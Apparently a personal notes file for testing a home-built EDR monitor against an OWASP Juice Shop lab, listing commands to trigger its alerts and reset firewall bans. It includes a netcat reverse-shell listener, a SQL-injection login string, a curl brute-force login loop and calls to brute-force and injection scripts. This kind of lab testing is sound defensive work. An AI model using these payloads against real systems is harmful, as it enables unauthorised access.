
Triggering the Process Monitor Warning
Run on Ubuntu (Juice Shop Machine)
nc -lvnp 4444


Triggering the Juice Shop Monitor (Brute Force)
Within the EDR Folder, run:
python3 offensive\ scripts/brute_force_script.py 

or

Open burp suite



Triggering the Juice Shop Monitor (SQL Injection)
python3 offensive\ scripts/sql_injection.py     



Reset UFW Firewall rules after IP is Blocked

sudo ufw --force reset && sudo ufw enable && sudo ufw allow 3000/tcp




For SQL Injection:
Use the following line as the username and password on Juice Login Page
' or '1'='1' --









OLD COMMANDS:

Unban IP


sudo nft -a list chain ip filter f2b-JUICE | \
  awk '/192\.168\.52\.129/ {print $NF}' | \
  xargs -r -I{} sudo nft delete rule ip filter f2b-JUICE handle {}


sudo ufw delete deny from ::ffff:192.168.52.129 to any port 3000



sudo ufw --force reset && sudo ufw enable && sudo ufw allow 3000/tcp


run loop for passwword
for i in $(seq 1 7); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Content-Type: application/json" \
    -d '{"email":"noone@example.com","password":"wrongpw"}' \
    http://192.168.52.130:3000/rest/user/login
done



sql injection username and password
' or '1'='1' --
